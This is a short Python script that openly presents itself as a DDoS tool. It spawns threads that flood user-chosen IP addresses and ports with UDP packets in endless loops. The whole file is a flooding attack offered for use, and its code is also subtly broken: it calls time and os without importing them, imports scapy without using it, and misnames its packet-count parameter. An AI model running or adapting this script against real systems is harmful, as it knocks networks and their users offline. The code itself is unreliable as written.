import socket
import scapy.all as scapy
import random
import threading
import Local_address

def send_packets(ip, port, data, proxy_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1

def main(ip_list):
    choose = int(input("\n\n Choose the IP address : "))
    ports = input("Ports (separated by commas): ").split(',')
    proxy_size = int(input("Proxy Size : "))
    threads = int(input("Number of threads : "))

    time.sleep(3)
    for ip in ip_list:
        for port in ports:
            # Use a bytes literal to create the data
            data = b'Hello, this is a DDOS attack'
            print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
            for i in range(threads):
                t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
                t.start()           

    # Lets keep the terminal clean
    if os.name == "nt": # Windows
        os.system("cls")
    else: # Linux or Mac
        os.system("clear")
    input("Press Enter to exit...")

if __name__ == '__main__':
    ip_list=Local_address.info()
    main(ip_list)
